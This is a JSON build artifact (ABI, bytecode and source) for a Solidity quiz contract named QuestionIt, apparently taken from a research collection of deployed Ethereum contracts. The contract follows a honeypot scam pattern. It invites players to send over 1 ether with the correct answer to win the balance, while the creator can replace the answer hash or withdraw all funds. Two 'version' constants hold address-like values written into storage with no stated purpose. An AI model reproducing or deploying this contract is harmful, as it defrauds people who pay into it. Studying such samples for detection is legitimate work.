{
  "contractName": "QuestionIt",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "Question",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "answer",
          "type": "string"
        }
      ],
      "name": "Answer",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "question",
          "type": "string"
        },
        {
          "name": "response",
          "type": "string"
        }
      ],
      "name": "Begin",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "End",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "question",
          "type": "string"
        },
        {
          "name": "_responseHash",
          "type": "bytes32"
        }
      ],
      "name": "New",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052736326e3367063c8166a8a6304858fef6363e3fbbd60035573633e3ee859631f1c827f63f50ab247633fad9ae060045534801561004057600080fd5b506106d9806100506000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306e649071461006f57806374c272b714610079578063c8166a8a1461011b578063e94e83d8146101ab578063ed8df16414610207575b005b610077610271565b005b610119600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610328565b005b34801561012757600080fd5b50610130610404565b6040518080602001828103825283818151815260200191508051906020019080838360005b83811015610170578082015181840152602081019050610155565b50505050905090810190601f16801561019d5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b610205600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506104a2565b005b61026f600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803560001916906020019092919050505061058b565b005b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415610326573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610324573d6000803e3d6000fd5b505b565b600060010260005460001916141561040057806040518082805190602001908083835b602083101515610370578051825260208201915060208101905060208303925061034b565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405180910390206000816000191690555081600190805190602001906103bd929190610608565b5033600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b5050565b60018054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561049a5780601f1061046f5761010080835404028352916020019161049a565b820191906000526020600020905b81548152906001019060200180831161047d57829003601f168201915b505050505081565b806040518082805190602001908083835b6020831015156104d857805182526020820191506020810190506020830392506104b3565b6001836020036101000a038019825116818451168082178552505050505050905001915050604051809103902060001916600054600019161480156105245750670de0b6b3a764000034115b15610588573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610586573d6000803e3d6000fd5b505b50565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156106045781600190805190602001906105f7929190610608565b5080600081600019169055505b5050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061064957805160ff1916838001178555610677565b82800160010185558215610677579182015b8281111561067657825182559160200191906001019061065b565b5b5090506106849190610688565b5090565b6106aa91905b808211156106a657600081600090555060010161068e565b5090565b905600a165627a7a7230582041540ecf17c01cd18e03608f0f99257880d8f78232f3c660e46874184386f5f60029",
  "source": "\n\ncontract QuestionIt\n{\n    bytes32 responseHash;\n    string public Question;\n    address questionSender;\n\n    function Answer(string answer)\n    public payable {\n        if (responseHash == keccak256(answer) && msg.value > 1 ether) {\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n \n    function Begin(string question, string response)\n    public payable {\n        if (responseHash == 0x0) {\n            responseHash = keccak256(response);\n            Question = question;\n            questionSender = msg.sender;\n        }\n    }\n\n    function End()\n    public payable {\n        if (msg.sender == questionSender) {\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n\n    function New(string question, bytes32 _responseHash)\n    public payable {\n        if (msg.sender == questionSender) {\n            Question = question;\n            responseHash = _responseHash;\n        }\n    }\n\n    function () public payable { }\n    uint256 versionMin = 0x006326e3367063c8166a8a6304858fef6363e3fbbd;\n    uint256 versionMaj = 0x00633e3ee859631f1c827f63f50ab247633fad9ae0;\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x19d0321ba91ed5edec4afe1da158a6b06bba03f0/contracts/0x19d0321ba91ed5edec4afe1da158a6b06bba03f0.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:48:46.431Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}